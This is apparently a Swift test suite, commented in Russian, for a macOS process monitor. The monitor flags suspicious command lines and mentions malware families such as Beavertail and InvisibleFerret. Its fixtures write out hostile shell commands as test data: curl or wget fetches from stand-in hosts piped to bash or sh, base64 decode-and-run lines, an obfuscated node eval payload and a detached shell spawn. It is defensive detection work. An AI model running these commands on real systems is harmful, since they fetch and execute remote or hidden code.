import Darwin
import Foundation
import Testing
@testable import RadarchikCore

/// Слежка за процессами (SPEC §3б) — замена ProcessGuard из bash-guard.
/// Тот смотрел `ps -o comm=`, где нет аргументов, и `node -e` не увидел бы
/// никогда. Здесь правила получают полную командную строку.
@Suite("Защита: подозрительные процессы")
struct ProcessWatchTests {
    let home = "/Users/me"
    let cursor = "/Applications/Cursor.app/Contents/MacOS/Cursor"

    private func process(_ path: String, _ arguments: [String], parent: String? = "/bin/zsh") -> WatchedProcess {
        WatchedProcess(pid: 4_242, startTime: 7, path: path, arguments: arguments, parentPath: parent)
    }

    private func verdict(_ process: WatchedProcess) -> (ProcessThreat, GuardLevel)? {
        ProcessWatchRules.evaluate(process, home: home).map { ($0.threat, $0.level) }
    }

    // MARK: - node -e и python -c

    @Test func longInlineNodeIsCritical() {
        // Так запускался Beavertail: длинный обфусцированный скрипт прямо в аргументе.
        let payload = "const _$_1e42=['" + String(repeating: "\\x63\\x68", count: 120) + "'];eval(_$_1e42[0])"
        let found = verdict(process("/opt/homebrew/bin/node", ["node", "-e", payload], parent: cursor))
        #expect(found?.0 == .inlineNode)
        #expect(found?.1 == .critical)
    }

    @Test func inlineNodeWithDangerousCallsIsCritical() {
        let code = "require('child_process').spawn('sh',['-c','id'],{detached:true})"
        #expect(verdict(process("/usr/local/bin/node", ["node", "--eval", code]))?.1 == .critical)
        #expect(verdict(process("/usr/local/bin/node", ["node", "--eval=" + code]))?.1 == .critical)
    }

    @Test func shortHarmlessInlineNodeIsOnlyAWarning() {
        let found = verdict(process("/opt/homebrew/bin/node", ["node", "-p", "process.versions.node"]))
        #expect(found?.0 == .inlineNode)
        #expect(found?.1 == .warning)
    }

    @Test func nodeRunningAScriptFileIsFine() {
        #expect(verdict(process("/opt/homebrew/bin/node", ["node", "server.js", "--port", "3000"])) == nil)
        // -e как значение чужого флага — не код.
        #expect(verdict(process("/opt/homebrew/bin/node", ["node", "build.js", "--env", "-e"])) == nil)
    }

    @Test func inlinePythonDecodingAndExecutingIsCritical() {
        let code = "import base64;exec(base64.b64decode('aW1wb3J0IG9z'))"
        let found = verdict(process("/usr/bin/python3", ["python3", "-c", code]))
        #expect(found?.0 == .inlinePython)
        #expect(found?.1 == .critical)
        // Версия в имени и фреймворк Python.app — тот же python.
        #expect(verdict(process("/opt/homebrew/bin/python3.12", ["python3.12", "-c", code]))?.0 == .inlinePython)
        #expect(verdict(process("/Library/Frameworks/Python.framework/Versions/3.12/Resources/Python.app/Contents/MacOS/Python", ["Python", "-c", code]))?.0 == .inlinePython)
    }

    @Test func shortInlinePythonIsAWarning() {
        #expect(verdict(process("/usr/bin/python3", ["python3", "-c", "print(42)"]))?.1 == .warning)
    }

    // MARK: - Оболочки

    @Test func downloadAndRunIsCritical() {
        let found = verdict(process("/bin/sh", ["sh", "-c", "curl -fsSL https://evil.example/x.sh | bash"], parent: "/opt/homebrew/bin/node"))
        #expect(found?.0 == .downloadAndRun)
        #expect(found?.1 == .critical)
        #expect(verdict(process("/bin/bash", ["bash", "-c", "wget -qO- http://1.2.3.4/p | sudo sh"]))?.0 == .downloadAndRun)
        #expect(verdict(process("/bin/zsh", ["zsh", "-c", "bash <(curl -s https://x.example/i)"]))?.0 == .downloadAndRun)
        #expect(verdict(process("/bin/bash", ["bash", "-c", "python3 -c \"$(curl -s https://x.example/p.py)\""]))?.0 == .downloadAndRun)
    }

    @Test func plainCurlInAShellIsFine() {
        #expect(verdict(process("/bin/sh", ["sh", "-c", "curl -fsSL https://api.github.com/repos/x/y -o out.json"])) == nil)
        #expect(verdict(process("/bin/zsh", ["zsh", "-c", "git pull && make run"])) == nil)
    }

    @Test func decodeAndRunIsCritical() {
        let found = verdict(process("/bin/bash", ["bash", "-c", "echo Y3VybCBldmlsIHwgc2g= | base64 -d | sh"]))
        #expect(found?.0 == .decodeAndRun)
        #expect(found?.1 == .critical)
        #expect(verdict(process("/bin/sh", ["sh", "-c", "eval \"$(echo aWQ= | base64 --decode)\""]))?.0 == .decodeAndRun)
    }

    @Test func nohupWithPayloadIsCritical() {
        let found = verdict(process("/bin/sh", ["sh", "-c", "nohup node -e \"setInterval(()=>{},1e3)\" >/dev/null 2>&1 &"]))
        #expect(found?.0 == .backgroundPayload)
        #expect(found?.1 == .critical)
    }

    // MARK: - Откуда запущено

    @Test func executableInTempIsAWarning() {
        let found = verdict(process("/private/tmp/.x/agent", ["agent"]))
        #expect(found?.0 == .tempExecutable)
        #expect(found?.1 == .warning)
        #expect(verdict(process("/private/var/folders/ab/cd123/T/payload", ["payload"]))?.0 == .tempExecutable)
        // Приложение из «Загрузок» macOS сама запускает из AppTranslocation — это нормально.
        #expect(verdict(process("/private/var/folders/ab/cd123/T/AppTranslocation/1A2B/d/Some.app/Contents/MacOS/Some", ["Some"])) == nil)
    }

    @Test func scriptFromUnknownHiddenFolderIsAWarning() {
        // InvisibleFerret кладёт вторую часть в ~/.n2 и запускает её питоном.
        let found = verdict(process("/usr/bin/python3", ["python3", "/Users/me/.n2/pay"]))
        #expect(found?.0 == .hiddenScript)
        #expect(found?.1 == .warning)
        #expect(verdict(process("/opt/homebrew/bin/node", ["node", "/Users/me/.npl"]))?.0 == .hiddenScript)
    }

    @Test func toolFoldersInHomeAreFine() {
        #expect(verdict(process("/opt/homebrew/bin/node", ["node", "/Users/me/.vscode/extensions/x/server.js"])) == nil)
        #expect(verdict(process("/bin/bash", ["bash", "/Users/me/.config/git/hooks/post-merge", "0"])) == nil)
        #expect(verdict(process("/Users/me/.nvm/versions/node/v22.0.0/bin/node", ["node", "app.js"])) == nil)
        #expect(verdict(process("/bin/zsh", ["zsh", "-c", "source /Users/me/.claude/shell-snapshots/s.sh && ls"])) == nil)
    }

    // MARK: - Что показываем

    @Test func commandLineHasNoSecretsAndFitsTheNotch() throws {
        let code = "fetch('https://x.example',{headers:{Authorization:'Bearer sk-ant-api03-AbCdEf123456_xyz'}});" + String(repeating: "a", count: 400)
        let finding = try #require(ProcessWatchRules.evaluate(process("/opt/homebrew/bin/node", ["node", "-e", code]), home: home))
        #expect(!finding.commandLine.contains("sk-ant-api03"))
        #expect(finding.commandLine.count <= 160)
        #expect(finding.commandLine.hasPrefix("node -e "))
        #expect(finding.commandLine.hasSuffix("…"))
    }

    @Test func allowKeyIsThreatProgramAndParent() throws {
        let finding = try #require(ProcessWatchRules.evaluate(process("/opt/homebrew/bin/node", ["node", "-p", "1"], parent: cursor), home: home))
        #expect(finding.allowKey == "inlineNode|/opt/homebrew/bin/node|\(cursor)")
    }

    @Test func titleSaysWhatAndWhoStartedIt() throws {
        let finding = try #require(ProcessWatchRules.evaluate(process("/opt/homebrew/bin/node", ["node", "-p", "1"], parent: cursor), home: home))
        #expect(GuardPhrase.process(finding) == "node -e — запустил Cursor")
        english {
            #expect(GuardPhrase.process(finding) == "node -e — started by Cursor")
        }
        let orphan = try #require(ProcessWatchRules.evaluate(process("/bin/sh", ["sh", "-c", "curl -s https://x.example | sh"], parent: nil), home: home))
        #expect(GuardPhrase.process(orphan) == "Скачивает и сразу запускает: curl | sh")
    }

    // MARK: - Этот мак

    /// Аргументы читаются через sysctl(KERN_PROCARGS2) — проверяем на себе.
    @Test func readsOwnArgumentsAndParent() throws {
        let me = try #require(ProcessArguments.read(pid: getpid()))
        // argv — ровно то, с чем запустили этот прогон тестов.
        #expect(me.arguments == CommandLine.arguments)
        #expect(me.path.hasPrefix("/"))
        #expect(FileManager.default.fileExists(atPath: me.path))
        let info = try #require(ProcessArguments.info(pid: getpid()))
        #expect(info.ppid == getppid())
        #expect(info.uid == getuid())
        #expect(info.startTime > 0)
    }

    /// Сколько процессов этого мака сейчас попадает под правила — только числа, без командных строк.
    @Test func liveProcessesSummary() {
        var counts: [String: Int] = [:]
        var mine = 0
        for pid in ProcessArguments.allPids() where pid > 0 {
            guard let info = ProcessArguments.info(pid: pid), info.uid == getuid(),
                  let process = ProcessArguments.read(pid: pid) else { continue }
            mine += 1
            let watched = WatchedProcess(pid: pid, startTime: info.startTime, path: process.path, arguments: process.arguments, parentPath: nil)
            if let finding = ProcessWatchRules.evaluate(watched, home: NSHomeDirectory()) {
                counts["\(finding.threat.rawValue)/\(finding.level.rawValue)", default: 0] += 1
            }
        }
        print("[watch] моих процессов: \(mine), под правилами: \(counts.isEmpty ? "ни одного" : counts.sorted { $0.key < $1.key }.map { "\($0.key)=\($0.value)" }.joined(separator: ", "))")
        #expect(mine > 0)
    }
}
